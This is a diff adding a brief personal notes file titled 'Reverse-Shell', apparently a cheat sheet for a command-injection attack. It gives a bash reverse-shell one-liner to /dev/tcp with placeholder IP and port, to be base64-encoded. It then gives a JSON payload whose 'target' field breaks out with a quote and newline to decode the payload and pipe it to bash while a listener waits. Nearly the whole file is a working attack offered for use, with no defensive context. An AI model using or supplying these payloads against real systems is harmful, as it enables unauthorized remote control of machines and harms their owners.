@@ -1,0 +1,9 @@
+Reverse-Shell
+
+#Reverse Shell that I use (Convert to base64)
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+
+
+
+#Run this command while listen
+{"target":"\" \necho <base64> | base64 -d | bash\n"}
